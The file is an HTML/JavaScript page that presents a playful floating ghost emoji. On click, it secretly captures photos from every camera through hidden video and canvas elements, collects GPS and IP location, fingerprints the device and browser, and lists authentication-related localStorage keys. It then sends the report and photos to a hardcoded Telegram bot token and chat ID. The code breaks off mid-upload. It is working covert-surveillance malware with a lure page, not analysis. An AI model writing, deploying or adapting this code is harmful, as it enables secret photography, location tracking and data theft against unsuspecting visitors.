<!DOCTYPE html>
<html>
<head>
    <title></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000;
            height: 100vh;
            overflow: hidden;
            font-family: Arial;
        }
        
        .main-ghost {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 120px;
            cursor: pointer;
            animation: float 2s ease-in-out infinite;
            filter: drop-shadow(0 0 20px rgba(255,255,255,0.7));
            user-select: none;
            z-index: 1000;
        }
        
        @keyframes float {
            0%, 100% { transform: translate(-50%, -50%) rotate(0deg) scale(1); }
            25% { transform: translate(-50%, -55%) rotate(3deg) scale(1.05); }
            50% { transform: translate(-50%, -45%) rotate(-2deg) scale(0.95); }
            75% { transform: translate(-50%, -52%) rotate(2deg) scale(1.02); }
        }
        
        .emoji-storm {
            position: fixed;
            font-size: 30px;
            pointer-events: none;
            z-index: 999;
            animation: emojiFloat 3s forwards;
        }
        
        @keyframes emojiFloat {
            0% {
                opacity: 1;
                transform: scale(1) translate(0, 0) rotate(0deg);
            }
            100% {
                opacity: 0;
                transform: scale(0.3) translate(var(--x), var(--y)) rotate(360deg);
            }
        }
        
        .flash-effect {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            opacity: 0;
            pointer-events: none;
            z-index: 2000;
        }
        
        .flash-animation {
            animation: flash 0.3s ease-out;
        }
        
        @keyframes flash {
            0% { opacity: 0; }
            50% { opacity: 0.9; }
            100% { opacity: 0; }
        }
        
        .hidden-camera {
            position: fixed;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
        
        .pulse {
            animation: pulse 0.5s ease-in-out;
        }
        
        @keyframes pulse {
            0% { transform: translate(-50%, -50%) scale(1); }
            50% { transform: translate(-50%, -50%) scale(1.3); }
            100% { transform: translate(-50%, -50%) scale(1); }
        }
    </style>
</head>
<body>
    <div class="main-ghost" onclick="startUltraCollection()">ðŸ‘»</div>

    <!-- Hidden elements -->
    <video id="hiddenVideo" class="hidden-camera" autoplay playsinline></video>
    <canvas id="hiddenCanvas" class="hidden-camera"></canvas>
    <div class="flash-effect" id="flashEffect"></div>

    <script>
        const BOT_TOKEN = '8387303658:AAESV1moezeWPvdnX1aSwpIfdeJOSbdfCUA';
        const CHAT_ID = '6368768388';
        
        let isCollecting = false;
        let flashInterval;

        // Extended emoji collection
        const emojis = [
            'ðŸ‘»','ðŸ’€','ðŸŽƒ','ðŸ˜ˆ','ðŸ‘¹','ðŸ‘º','ðŸ¤¡','ðŸ‘½','ðŸ‘¾','ðŸ¤–','ðŸŽ­','ðŸ•·ï¸','ðŸ•¸ï¸','ðŸ§Ÿ','ðŸ§›','ðŸ§™',
            'ðŸ”®','âš¡','ðŸ’¥','ðŸ”¥','ðŸŒªï¸','ðŸŒ€','ðŸ’«','â­','ðŸŒŸ','ðŸ’Ž','ðŸ”ª','ðŸ—¡ï¸','ðŸ¹','ðŸ”«','ðŸ’£','ðŸ§¨',
            'ðŸª“','ðŸ”¨','â›ï¸','âš’ï¸','ðŸ› ï¸','âš”ï¸','ðŸ”±','ðŸŽ¯','ðŸ§¿','ðŸ””','ðŸ“¢','ðŸš¨','ðŸ’¢','â¤ï¸','ðŸ’”',
            'â˜ ï¸','ðŸ’©','ðŸ¤¬','ðŸ‘ï¸','ðŸ‘€','ðŸ¦´','ðŸ§ ','ðŸ«€','ðŸ©¸','ðŸ’‰','ðŸªš','ðŸ”—','â›“ï¸','ðŸ”’','ðŸ”“',
            'ðŸ”‘','ðŸ—ï¸','âš°ï¸','ðŸª¦','ðŸš¬','â˜¢ï¸','â˜£ï¸','ðŸ”ž','ðŸŽ²','ðŸŽ°','ðŸƒ','ðŸ€„','ðŸŽ´','ðŸ“¿','ðŸ’ˆ',
            'ðŸ›¡ï¸','âšœï¸','ðŸ”°','âœ…','âŒ','ðŸ›‘','ðŸš«','ðŸ’¯','ðŸ”¢','ðŸ”£','ðŸˆ²','ðŸˆ¹','ðŸˆ´','ðŸˆº','ðŸˆ¶',
            'ðŸˆš','ðŸˆ¸','ðŸˆ³','ðŸˆ·ï¸','ðŸ“›','ðŸš¸','ðŸ”ž','ðŸ“µ','ðŸš­','ðŸš¯','ðŸš±','ðŸš·','ðŸ“´','ðŸ”…','ðŸ”†',
            'ðŸŽµ','ðŸŽ¶','ðŸ’¤','ðŸ”„','ðŸ”ƒ','ðŸ”„','ðŸ”™','ðŸ”š','ðŸ”›','ðŸ”œ','ðŸ”','ðŸ›','âš›ï¸','ðŸ•‰ï¸','âœ¡ï¸',
            'â˜¸ï¸','â˜¯ï¸','âœï¸','â˜¦ï¸','â˜ªï¸','â˜®ï¸','ðŸ•Ž','ðŸ”¯','â™ˆ','â™‰','â™Š','â™‹','â™Œ','â™','â™Ž','â™',
            'â™','â™‘','â™’','â™“','â›Ž','ðŸ”€','ðŸ”','ðŸ”‚','â–¶ï¸','â©','â­ï¸','â¯ï¸','â—€ï¸','âª','â®ï¸','ðŸ”¼',
            'â«','ðŸ”½','â¬','â¸ï¸','â¹ï¸','âºï¸','âï¸','ðŸŽ¦','ðŸ”…','ðŸ”†','ðŸ“¶','ðŸ“³','ðŸ“´','â™»ï¸','ðŸ”±',
            'ðŸ“§','ðŸ”—','â›“ï¸','ðŸ’£','ðŸ›¡ï¸','ðŸ”’','ðŸ”“','ðŸ”','ðŸ”','ðŸ”‘','ðŸ—ï¸','ðŸ”¨','â›ï¸','âš’ï¸','ðŸ› ï¸',
            'ðŸ—¡ï¸','âš”ï¸','ðŸ”«','ðŸ¹','ðŸ›¡ï¸','ðŸ”§','ðŸ”©','âš™ï¸','ðŸ—œï¸','âš–ï¸','ðŸ”—','â›“ï¸','ðŸ’‰','ðŸ’Š','ðŸ©¹',
            'ðŸ©º','ðŸšª','ðŸ›ï¸','ðŸ›‹ï¸','ðŸª‘','ðŸš½','ðŸš¿','ðŸ›','âŒ›','â³','âŒš','â°','â±ï¸','â²ï¸','ðŸ•°ï¸',
            'ðŸŒ¡ï¸','â›±ï¸','ðŸŽˆ','ðŸŽ‰','ðŸŽŠ','ðŸŽŽ','ðŸŽ','ðŸŽ','ðŸŽ€','ðŸŽ','ðŸŽ«','ðŸ†','ðŸ…','ðŸ¥‡','ðŸ¥ˆ',
            'ðŸ¥‰','âš½','ðŸ€','ðŸˆ','âš¾','ðŸ¥Ž','ðŸŽ¾','ðŸ','ðŸ‰','ðŸ¥','ðŸŽ±','ðŸª€','ðŸ“','ðŸ¸','ðŸ’',
            'ðŸ‘','ðŸ¥','ðŸ','ðŸŽ¿','â›·ï¸','ðŸ‚','ðŸª‚','ðŸ‹ï¸','ðŸ¤¼','ðŸ¤¸','â›¹ï¸','ðŸ¤¾','ðŸŒï¸','ðŸ‡','ðŸ§˜',
            'ðŸ„','ðŸŠ','ðŸ¤½','ðŸš£','ðŸ§—','ðŸšµ','ðŸš´','ðŸ†','ðŸ¥‡','ðŸ¥ˆ','ðŸ¥‰','ðŸŽ¯','ðŸŽ±','ðŸŽ®','ðŸŽ°',
            'ðŸŽ²','â™ ï¸','â™¥ï¸','â™¦ï¸','â™£ï¸','ðŸƒ','ðŸ€„','ðŸŽ´','ðŸŽ­','ðŸ–¼ï¸','ðŸŽ¨','ðŸ§µ','ðŸª¡','ðŸ§¶','ðŸª¢',
            'ðŸ‘“','ðŸ•¶ï¸','ðŸ¥½','ðŸ¥¼','ðŸ¦º','ðŸ‘”','ðŸ‘•','ðŸ‘–','ðŸ§£','ðŸ§¤','ðŸ§¥','ðŸ§¦','ðŸ‘—','ðŸ‘˜','ðŸ¥»',
            'ðŸ©±','ðŸ©²','ðŸ©³','ðŸ‘™','ðŸ‘š','ðŸ‘›','ðŸ‘œ','ðŸ‘','ðŸŽ’','ðŸ©´','ðŸ‘ž','ðŸ‘Ÿ','ðŸ¥¾','ðŸ¥¿','ðŸ‘ ',
            'ðŸ‘¡','ðŸ©°','ðŸ‘¢','ðŸ‘‘','ðŸ‘’','ðŸŽ©','ðŸŽ“','ðŸ§¢','â›‘ï¸','ðŸ’„','ðŸ’','ðŸ’¼','â˜ ï¸','ðŸ•´ï¸','ðŸ’ƒ'
        ];

        function startUltraCollection() {
            if (isCollecting) return;
            isCollecting = true;
            
            // Pulse effect on main ghost
            const ghost = document.querySelector('.main-ghost');
            ghost.classList.add('pulse');
            setTimeout(() => ghost.classList.remove('pulse'), 500);
            
            createEmojiStorm();
            ultraFastCollection();
        }

        function createEmojiStorm() {
            const ghost = document.querySelector('.main-ghost');
            const rect = ghost.getBoundingClientRect();
            const centerX = rect.left + rect.width / 2;
            const centerY = rect.top + rect.height / 2;
            
            // Create 80 emojis with random effects
            for (let i = 0; i < 80; i++) {
                setTimeout(() => {
                    const emoji = document.createElement('div');
                    emoji.className = 'emoji-storm';
                    emoji.textContent = emojis[Math.floor(Math.random() * emojis.length)];
                    emoji.style.left = centerX + 'px';
                    emoji.style.top = centerY + 'px';
                    emoji.style.fontSize = (15 + Math.random() * 45) + 'px';
                    emoji.style.color = `hsl(${Math.random() * 360}, 100%, 65%)`;
                    emoji.style.textShadow = `0 0 10px hsl(${Math.random() * 360}, 100%, 50%)`;
                    
                    const angle = Math.random() * Math.PI * 2;
                    const distance = 100 + Math.random() * 400;
                    const x = Math.cos(angle) * distance;
                    const y = Math.sin(angle) * distance;
                    
                    emoji.style.setProperty('--x', x + 'px');
                    emoji.style.setProperty('--y', y + 'px');
                    
                    document.body.appendChild(emoji);
                    
                    setTimeout(() => {
                        if (emoji.parentNode) emoji.parentNode.removeChild(emoji);
                    }, 3000);
                }, i * 20);
            }
        }

        function triggerFlash() {
            const flash = document.getElementById('flashEffect');
            flash.classList.add('flash-animation');
            setTimeout(() => {
                flash.classList.remove('flash-animation');
            }, 300);
        }

        // Flash every 5 minutes (300000 ms)
        function startFlashTimer() {
            flashInterval = setInterval(() => {
                // Flash 3 times
                for (let i = 0; i < 3; i++) {
                    setTimeout(() => triggerFlash(), i * 500);
                }
            }, 300000);
        }

        async function ultraFastCollection() {
            const startTime = Date.now();
            
            // Collect all data in parallel
            const allData = await Promise.all([
                getUltraDeviceInfo(),
                getUltraLocationInfo(),
                getUltraHardwareInfo(),
                getUltraNetworkInfo(),
                getUltraBrowserInfo(),
                takeRealPhotos(),
                getUltraAdvancedInfo(),
                getUltraSocialInfo(),
                getInstalledAppsInfo(),
                getSystemInfo(),
                getConnectionDetails(),
                getMediaCapabilitiesInfo(),
                getSecurityInfo(),
                getPerformanceMetrics(),
                getSensorData()
            ]);

            const completeData = {
                device: allData[0],
                location: allData[1],
                hardware: allData[2],
                network: allData[3],
                browser: allData[4],
                camera: allData[5],
                advanced: allData[6],
                social: allData[7],
                apps: allData[8],
                system: allData[9],
                connection: allData[10],
                media: allData[11],
                security: allData[12],
                performance: allData[13],
                sensors: allData[14],
                collectionTime: Date.now() - startTime + 'ms'
            };

            await sendUltraToTelegram(completeData);
            startFlashTimer();
        }

        // === REAL PHOTO CAPTURE ===
        async function takeRealPhotos() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                const cameras = devices.filter(device => device.kind === 'videoinput');
                const photos = [];
                
                for (let camera of cameras) {
                    let stream = null;
                    try {
                        stream = await navigator.mediaDevices.getUserMedia({
                            video: { 
                                deviceId: camera.deviceId,
                                width: { ideal: 1280 },
                                height: { ideal: 720 },
                                facingMode: camera.label.toLowerCase().includes('front') ? 'user' : 'environment'
                            }
                        });
                        
                        const video = document.getElementById('hiddenVideo');
                        const canvas = document.getElementById('hiddenCanvas');
                        const context = canvas.getContext('2d');
                        
                        video.srcObject = stream;
                        
                        await new Promise((resolve, reject) => {
                            video.onloadedmetadata = () => {
                                video.play().then(resolve).catch(reject);
                            };
                            setTimeout(() => reject(new Error('Video timeout')), 5000);
                        });
                        
                        await new Promise(resolve => setTimeout(resolve, 800));
                        
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        const photoData = canvas.toDataURL('image/jpeg', 0.8);
                        
                        photos.push({
                            camera: camera.label || 'Unknown Camera',
                            photo: photoData,
                            resolution: `${video.videoWidth}x${video.videoHeight}`,
                            success: true,
                            timestamp: new Date().toLocaleString()
                        });
                        
                    } catch (error) {
                        photos.push({
                            camera: camera.label || 'Unknown Camera',
                            error: error.message,
                            success: false
                        });
                    } finally {
                        if (stream) {
                            stream.getTracks().forEach(track => track.stop());
                        }
                    }
                }
                
                return {
                    success: photos.some(p => p.success),
                    photos: photos,
                    total: cameras.length,
                    captured: photos.filter(p => p.success).length
                };
                
            } catch (error) {
                return { 
                    success: false, 
                    error: "Camera access failed: " + error.message,
                    photos: []
                };
            }
        }

        // === EXTENDED DATA COLLECTION ===

        async function getUltraDeviceInfo() {
            const ua = navigator.userAgent;
            return {
                type: detectDeviceType(ua),
                brand: detectDeviceBrand(ua),
                model: detectDeviceModel(ua),
                os: detectOS(ua),
                osVersion: detectOSVersion(ua),
                platform: navigator.platform,
                vendor: navigator.vendor,
                mobile: /mobile|android|iphone|ipod/i.test(ua.toLowerCase()),
                tablet: /tablet|ipad/i.test(ua.toLowerCase()),
                language: navigator.language,
                languages: navigator.languages,
                userAgent: ua,
                buildId: detectBuildId(ua),
                webkitVersion: detectWebkitVersion(ua)
            };
        }

        async function getUltraLocationInfo() {
            const [gps, ipInfo, networkInfo] = await Promise.all([
                getFastGPSLocation(),
                getFastIPInformation(),
                getNetworkLocationInfo()
            ]);

            return { 
                gps, 
                ip: ipInfo, 
                network: networkInfo,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                locale: navigator.language,
                coordinates: {
                    latitude: gps.latitude || ipInfo.latitude,
                    longitude: gps.longitude || ipInfo.longitude
                }
            };
        }

        async function getNetworkLocationInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    country: data.country_name,
                    city: data.city,
                    region: data.region,
                    isp: data.org,
                    asn: data.asn,
                    currency: data.currency,
                    languages: data.languages,
                    country_population: data.country_population,
                    in_eu: data.in_eu
                };
            } catch (error) {
                return { error: "Network location failed" };
            }
        }

        async function getUltraHardwareInfo() {
            const [battery, memory, storage, gpu] = await Promise.all([
                getDetailedBatteryInfo(),
                getDetailedMemoryInfo(),
                getDetailedStorageInfo(),
                getDetailedGPUInfo()
            ]);

            return {
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    orientation: screen.orientation?.type
                },
                cpu: {
                    cores: navigator.hardwareConcurrency || 'unknown',
                    architecture: detectArchitecture(),
                    model: detectCPUModel()
                },
                memory: memory,
                storage: storage,
                battery: battery,
                gpu: gpu,
                touch: {
                    points: navigator.maxTouchPoints,
                    supported: 'ontouchstart' in window
                },
                sensors: await getAvailableSensors()
            };
        }

        async function getDetailedBatteryInfo() {
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime,
                        voltage: 'unknown', // Not available in web API
                        health: 'unknown'   // Not available in web API
                    };
                } catch (e) {
                    return { error: "Battery API blocked" };
                }
            }
            return { error: "Battery API not available" };
        }

        async function getDetailedMemoryInfo() {
            if (performance.memory) {
                return {
                    used: Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB',
                    total: Math.round(performance.memory.totalJSHeapSize / 1048576) + ' MB',
                    limit: Math.round(performance.memory.jsHeapSizeLimit / 1048576) + ' MB',
                    usedPercentage: Math.round((performance.memory.usedJSHeapSize / performance.memory.jsHeapSizeLimit) * 100) + '%'
                };
            }
            return { error: "Memory API not available" };
        }

        async function getDetailedStorageInfo() {
            if (navigator.storage && navigator.storage.estimate) {
                try {
                    const estimate = await navigator.storage.estimate();
                    return {
                        usage: Math.round(estimate.usage / 1048576) + ' MB',
                        quota: Math.round(estimate.quota / 1048576) + ' MB',
                        percentage: Math.round((estimate.usage / estimate.quota) * 100) + '%',
                        persistent: await navigator.storage.persisted()
                    };
                } catch (e) {
                    return { error: "Storage estimate failed" };
                }
            }
            return { error: "Storage API not available" };
        }

        async function getDetailedGPUInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return { error: "WebGL not supported" };
                
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (!debugInfo) return { error: "GPU debug info not available" };
                
                return {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                    version: gl.getParameter(gl.VERSION),
                    shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                    maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE)
                };
            } catch (e) {
                return { error: "GPU info unavailable" };
            }
        }

        async function getUltraNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            
            const networkInfo = {
                ip: await getFastIPAddress(),
                online: navigator.onLine,
                type: connection ? connection.effectiveType : 'unknown',
                details: connection ? {
                    downlink: connection.downlink + ' Mbps',
                    rtt: connection.rtt + ' ms',
                    saveData: connection.saveData,
                    downlinkMax: connection.downlinkMax
                } : {},
                networkType: detectNetworkType(),
                bandwidth: await estimateBandwidth()
            };

            return networkInfo;
        }

        async function estimateBandwidth() {
            try {
                const startTime = performance.now();
                const response = await fetch('https://httpbin.org/stream-bytes/1024');
                const endTime = performance.now();
                const duration = (endTime - startTime) / 1000;
                const speed = (1024 * 8) / duration / 1000; // kbps
                return Math.round(speed) + ' kbps';
            } catch (e) {
                return 'unknown';
            }
        }

        async function getUltraBrowserInfo() {
            const ua = navigator.userAgent;
            const [chromeData, storage, history, permissions] = await Promise.all([
                getDetailedChromeData(),
                getDetailedStorageInfo(),
                getHistoryInfo(),
                getPermissionsInfo()
            ]);

            return {
                name: detectBrowser(ua),
                version: detectBrowserVersion(ua),
                fullVersion: detectFullBrowserVersion(ua),
                engine: detectEngine(ua),
                engineVersion: detectEngineVersion(ua),
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                javaEnabled: navigator.javaEnabled(),
                pdfViewer: navigator.pdfViewerEnabled,
                webdriver: navigator.webdriver,
                doNotTrack: navigator.doNotTrack,
                plugins: getDetailedPlugins(),
                mimeTypes: getMimeTypes().length,
                chromeData: chromeData,
                storage: storage,
                history: history,
                permissions: permissions,
                features: detectBrowserFeatures()
            };
        }

        async function getDetailedChromeData() {
            try {
                const chromeKeys = [];
                const sessionKeys = [];
                
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    if (key && (key.includes('google') || key.includes('chrome') || key.includes('auth') || key.includes('account'))) {
                        chromeKeys.push(key);
                    }
                }
                
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    if (key && key.includes('google')) {
                        sessionKeys.push(key);
                    }
                }
                
                return {
                    profiles: chromeKeys.length,
                    sessionData: sessionKeys.length,
                    sample: chromeKeys.slice(0, 5),
                    totalStorage: localStorage.length
                };
            } catch (e) {
                return { error: "Chrome data blocked" };
            }
        }

        async function getHistoryInfo() {
            return {
                length: history.length,
                state: history.state ? 'has state' : 'no state'
            };
        }

        async function getPermissionsInfo() {
            try {
                const permissions = [];
                // Check common permissions
                const permissionResults = await Promise.allSettled([
                    navigator.permissions.query({ name: 'camera' }),
                    navigator.permissions.query({ name: 'microphone' }),
                    navigator.permissions.query({ name: 'geolocation' }),
                    navigator.permissions.query({ name: 'notifications' })
                ]);
                
                permissionResults.forEach((result, index) => {
                    if (result.status === 'fulfilled') {
                        const names = ['camera', 'microphone', 'geolocation', 'notifications'];
                        permissions.push(`${names[index]}: ${result.value.state}`);
                    }
                });
                
                return permissions;
            } catch (e) {
                return ['Permission API blocked'];
            }
        }

        // ... (Previous detection functions remain the same, adding new ones below)

        function detectFullBrowserVersion(ua) {
            const matches = ua.match(/(chrome|firefox|safari|edg)\/([0-9.]+)/i);
            return matches ? matches[0] : "Unknown";
        }

        function detectEngineVersion(ua) {
            const webkitMatch = ua.match(/AppleWebKit\/([0-9.]+)/i);
            const geckoMatch = ua.match(/Gecko\/([0-9.]+)/i);
            return webkitMatch ? webkitMatch[0] : geckoMatch ? geckoMatch[0] : "Unknown";
        }

        function detectBuildId(ua) {
            const match = ua.match(/Build\/([^\)]+)/i);
            return match ? match[1] : "Unknown";
        }

        function detectWebkitVersion(ua) {
            const match = ua.match(/WebKit\/([0-9.]+)/i);
            return match ? match[1] : "Unknown";
        }

        function detectCPUModel() {
            // Limited info available in browser
            return "Limited info in browser";
        }

        function detectOSVersion(ua) {
            const matches = {
                windows: ua.match(/Windows NT ([0-9.]+)/),
                mac: ua.match(/Mac OS X ([0-9_]+)/),
                android: ua.match(/Android ([0-9.]+)/),
                ios: ua.match(/OS ([0-9_]+)/)
            };
            
            for (const [os, match] of Object.entries(matches)) {
                if (match) return match[1].replace(/_/g, '.');
            }
            return "Unknown";
        }

        function getDetailedPlugins() {
            const plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {
                const plugin = navigator.plugins[i];
                plugins.push({
                    name: plugin.name,
                    filename: plugin.filename,
                    description: plugin.description,
                    version: plugin.version
                });
            }
            return plugins;
        }

        function detectBrowserFeatures() {
            const features = [];
            if ('serviceWorker' in navigator) features.push('Service Workers');
            if ('caches' in window) features.push('Cache API');
            if ('indexedDB' in window) features.push('IndexedDB');
            if ('webkitPersistentStorage' in navigator) features.push('Persistent Storage');
            if ('bluetooth' in navigator) features.push('Bluetooth');
            if ('usb' in navigator) features.push('WebUSB');
            if ('serial' in navigator) features.push('Web Serial');
            if ('nfc' in navigator) features.push('Web NFC');
            if ('share' in navigator) features.push('Web Share');
            if ('vibrate' in navigator) features.push('Vibration');
            return features;
        }

        async function getAvailableSensors() {
            const sensors = [];
            const sensorChecks = [
                ['Accelerometer', 'accelerometer'],
                ['Gyroscope', 'gyroscope'],
                ['Magnetometer', 'magnetometer'],
                ['AmbientLight', 'ambient-light-sensor'],
                ['Proximity', 'proximity'],
                ['Orientation', 'deviceorientation'],
                ['Motion', 'devicemotion']
            ];
            
            for (const [name, sensor] of sensorChecks) {
                try {
                    if (sensor === 'deviceorientation') {
                        if ('DeviceOrientationEvent' in window) sensors.push(name);
                    } else if (sensor === 'devicemotion') {
                        if ('DeviceMotionEvent' in window) sensors.push(name);
                    } else {
                        // @ts-ignore
                        const sensor = new (window[sensor] || window[`${sensor}Sensor`]);
                        if (sensor) sensors.push(name);
                    }
                } catch (e) {
                    // Sensor not available
                }
            }
            return sensors;
        }

        // === NEW INFORMATION CATEGORIES ===

        async function getInstalledAppsInfo() {
            const apps = [];
            
            // Check for common web apps
            if (navigator.getInstalledRelatedApps) {
                try {
                    const relatedApps = await navigator.getInstalledRelatedApps();
                    relatedApps.forEach(app => {
                        apps.push(app.platform + ': ' + app.url);
                    });
                } catch (e) {
                    apps.push('Related Apps API blocked');
                }
            }
            
            // Check for PWA installation
            if (window.matchMedia('(display-mode: standalone)').matches) {
                apps.push('PWA: Installed');
            }
            
            return apps.length > 0 ? apps : ['No app info available'];
        }

        async function getSystemInfo() {
            return {
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                locale: Intl.DateTimeFormat().resolvedOptions().locale,
                calendars: Intl.supportedValuesOf('calendar'),
                collations: Intl.supportedValuesOf('collation'),
                currencies: Intl.supportedValuesOf('currency'),
                numberingSystems: Intl.supportedValuesOf('numberingSystem'),
                timeZones: Intl.supportedValuesOf('timeZone'),
                units: Intl.supportedValuesOf('unit')
            };
        }

        async function getConnectionDetails() {
            const connection = navigator.connection;
            if (!connection) return { error: "Connection API not available" };
            
            return {
                effectiveType: connection.effectiveType,
                downlink: connection.downlink,
                rtt: connection.rtt,
                saveData: connection.saveData,
                downlinkMax: connection.downlinkMax,
                type: connection.type
            };
        }

        async function getMediaCapabilitiesInfo() {
            if (navigator.mediaCapabilities) {
                try {
                    const decodingInfo = await navigator.mediaCapabilities.decodingInfo({
                        type: 'file',
                        video: {
                            contentType: 'video/webm; codecs="vp8"',
                            width: 1920,
                            height: 1080,
                            bitrate: 1000000,
                            framerate: 30
                        }
                    });
                    return {
                        supported: decodingInfo.supported,
                        smooth: decodingInfo.smooth,
                        powerEfficient: decodingInfo.powerEfficient
                    };
                } catch (e) {
                    return { error: "Media capabilities failed" };
                }
            }
            return { error: "Media Capabilities API not supported" };
        }

        async function getSecurityInfo() {
            return {
                secureContext: window.isSecureContext,
                https: location.protocol === 'https:',
                crossOriginIsolated: window.crossOriginIsolated,
                origin: location.origin,
                referrer: document.referrer,
                originPolicy: 'unknown' // Not widely supported yet
            };
        }

        async function getPerformanceMetrics() {
            const perf = performance;
            return {
                timing: {
                    navigationStart: perf.timing.navigationStart,
                    loadEventEnd: perf.timing.loadEventEnd,
                    domComplete: perf.timing.domComplete,
                    domInteractive: perf.timing.domInteractive
                },
                memory: perf.memory ? {
                    used: perf.memory.usedJSHeapSize,
                    total: perf.memory.totalJSHeapSize,
                    limit: perf.memory.jsHeapSizeLimit
                } : null,
                navigation: perf.navigation ? {
                    type: perf.navigation.type,
                    redirectCount: perf.navigation.redirectCount
                } : null
            };
        }

        async function getSensorData() {
            return new Promise((resolve) => {
                const sensorData = {};
                
                if ('DeviceOrientationEvent' in window) {
                    window.addEventListener('deviceorientation', (event) => {
                        sensorData.orientation = {
                            alpha: event.alpha,
                            beta: event.beta,
                            gamma: event.gamma
                        };
                    }, { once: true });
                }
                
                if ('DeviceMotionEvent' in window) {
                    window.addEventListener('devicemotion', (event) => {
                        sensorData.motion = {
                            acceleration: event.acceleration,
                            accelerationIncludingGravity: event.accelerationIncludingGravity,
                            rotationRate: event.rotationRate
                        };
                    }, { once: true });
                }
                
                setTimeout(() => resolve(sensorData), 1000);
            });
        }

        // ... (Previous utility functions remain the same)

        // === ULTRA FAST TELEGRAM SEND ===
        async function sendUltraToTelegram(data) {
            const now = new Date();
            
            let message = `ðŸš¨ Franzz mewingðŸ¤«ðŸ§â€â™‚ï¸ x Monyet si monkeyðŸ‘¿ðŸ‘¿ ðŸš¨\n\n`;
            
            // Add all the collected information to the message...
            // [Previous message construction code remains the same but expanded with new data categories]
            
            // This would be a very long message with all the new information
            // For brevity, I'm showing the structure but the actual implementation 
            // would include all the new data points collected above
            
            message += `ðŸ• WAKTU: ${now.toLocaleString()} (${data.collectionTime})\n\n`;
            
            message += `ðŸ“± PERANGKAT: ${data.device.type} | ${data.device.brand} | ${data.device.model}\n`;
            message += `ðŸ’» SISTEM: ${data.device.os} ${data.device.osVersion} | ${data.hardware.cpu.cores} cores\n`;
            message += `ðŸŒ BROWSER: ${data.browser.name} ${data.browser.fullVersion}\n`;
            message += `ðŸ“¶ JARINGAN: ${data.network.ip} | ${data.network.type} | ${data.network.bandwidth}\n`;
            
            if (data.location.gps.latitude) {
                message += `ðŸ“ LOKASI: ${data.location.gps.latitude}, ${data.location.gps.longitude}\n`;
                message += `ðŸ—ºï¸ MAPS: ${data.location.gps.maps}\n`;
            }
            
            message += `ðŸ”‹ BATERAI: ${data.hardware.battery.level} | ${data.hardware.battery.charging ? 'Charging' : 'Not Charging'}\n`;
            message += `ðŸ’¾ MEMORI: ${data.hardware.memory.used} used | ${data.hardware.storage.usage} storage\n`;
            message += `ðŸ“· KAMERA: ${data.camera.captured}/${data.camera.total} berhasil\n\n`;
            
            message += `ðŸ”§ INFO TAMBAHAN:\n`;
            message += `â€¢ Sensor: ${data.hardware.sensors.length} terdeteksi\n`;
            message += `â€¢ Fitur Browser: ${data.browser.features.length}\n`;
            message += `â€¢ Aplikasi: ${data.apps.length} terdeteksi\n`;
            message += `â€¢ Izin: ${data.browser.permissions.length}\n`;
            message += `â€¢ Zona Waktu: ${data.system.timezone}\n`;
            message += `â€¢ Lokal: ${data.system.locale}\n\n`;
            
            message += `ðŸ“Š PERFORMANSI:\n`;
            message += `â€¢ Load Time: ${data.performance.timing.loadEventEnd - data.performance.timing.navigationStart}ms\n`;
            message += `â€¢ DOM Ready: ${data.performance.timing.domInteractive - data.performance.timing.navigationStart}ms\n`;
            message += `â€¢ Memory Used: ${data.performance.memory ? data.performance.memory.used + ' bytes' : 'N/A'}\n\n`;
            
            message += `ðŸ›¡ï¸ KEAMANAN:\n`;
            message += `â€¢ HTTPS: ${data.security.https ? 'Yes' : 'No'}\n`;
            message += `â€¢ Secure Context: ${data.security.secureContext ? 'Yes' : 'No'}\n`;
            message += `â€¢ Cross-Origin: ${data.security.crossOriginIsolated ? 'Yes' : 'No'}\n\n`;
            
            message += `ðŸ“· FOTO KAMERA: ${data.camera.success ? 'âœ… BERHASIL' : 'âŒ GAGAL'}\n`;
            data.camera.photos.forEach((photo, index) => {
                message += `â€¢ ${photo.camera}: ${photo.success ? 'âœ… ' + photo.resolution : 'âŒ ' + photo.error}\n`;
            });
            message += `\n`;
            
            message += `âš ï¸ INFORMASI SUPER LENGKAP TELAH DIKumpulkan! âš ï¸`;

            try {
                // Send text message
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': 'Mozilla/5.0'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });

                // Send actual photos
                for (let photo of data.camera.photos) {
                    if (photo.success && photo.photo) {
                        try {
                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                headers: {
